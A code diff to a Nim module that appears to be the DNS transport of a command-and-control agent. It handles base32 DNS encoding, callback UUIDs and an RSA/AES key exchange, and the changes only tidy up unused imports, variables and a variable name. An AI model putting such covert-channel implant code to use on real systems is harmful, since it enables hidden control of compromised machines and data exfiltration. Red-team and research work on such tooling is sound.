@@ -1,15 +1,12 @@
-import std/[strutils, json, random, os, sequtils, times, net, nativesockets, base64]
+import std/[strutils, json, random, os, sequtils, net, nativesockets, base64]
 when not defined(windows):
   import posix
 import ../config
 import ../utils/crypto
 import ../utils/debug
-import ../utils/strenc
 
 const encryptedExchange {.used.} = static: getEnv("ENCRYPTED_EXCHANGE_CHECK", "false").toLowerAscii in ["true", "t"]
 when encryptedExchange:
-  import std/base64
-  import ../utils/rsa
   import ../utils/key_exchange
 
 type
@@ -186,7 +183,7 @@ proc encodeToDns(data: string): string =
   
   return encoded
 
-proc decodeFromDns(encoded: string): string =
+proc decodeFromDns(encoded: string): string {.used.} =
   ## Decode base32 DNS-encoded data
   const base32Alphabet = "abcdefghijklmnopqrstuvwxyz234567"
   var decoded = ""
@@ -362,7 +359,6 @@ proc skipDnsName(data: string, pos: var int): bool =
   
   var maxJumps = 20  # Prevent infinite loops from malformed packets
   var jumped = false
-  var origPos = pos
   
   while pos < data.len and maxJumps > 0:
     let labelLen = ord(data[pos])
@@ -1189,7 +1185,6 @@ proc send*(profile: var DnsProfile, data: string, callbackUuid: string = ""): st
         profile.nextMessageID = responseMessageID + 1
         return ""
       
-      let responseUuid = responseData[0..<36]
       let encryptedData = responseData[36..^1]
       
       # Decrypt if needed (DNS sends raw bytes, not base64)
@@ -1242,21 +1237,21 @@ proc performKeyExchange*(profile: var DnsProfile): tuple[success: bool, newUuid:
     return (true, "")
   
   # Use shared key exchange implementation
-  when encryptedExchange:
+  else:
     # Create a send wrapper that matches the expected signature
     var p = profile  # Create capturable local reference
     proc sendWrapper(data: string, uuid: string): string =
       return p.send(data, uuid)
     
-    let result = performRsaKeyExchange(profile.config, profile.config.uuid, sendWrapper)
+    let exchangeResult = performRsaKeyExchange(profile.config, profile.config.uuid, sendWrapper)
     
-    if result.success and result.sessionKey.len > 0:
+    if exchangeResult.success and exchangeResult.sessionKey.len > 0:
       # Set the AES key
-      profile.setAesKey(result.sessionKey)
-      return (true, result.newUuid)
-    elif result.success:
+      profile.setAesKey(exchangeResult.sessionKey)
+      return (true, exchangeResult.newUuid)
+    elif exchangeResult.success:
       # No key exchange needed (AESPSK mode)
       return (true, "")
     else:
-      debug "[DEBUG] Key exchange failed: ", result.error
+      debug "[DEBUG] Key exchange failed: ", exchangeResult.error
       return (false, "")
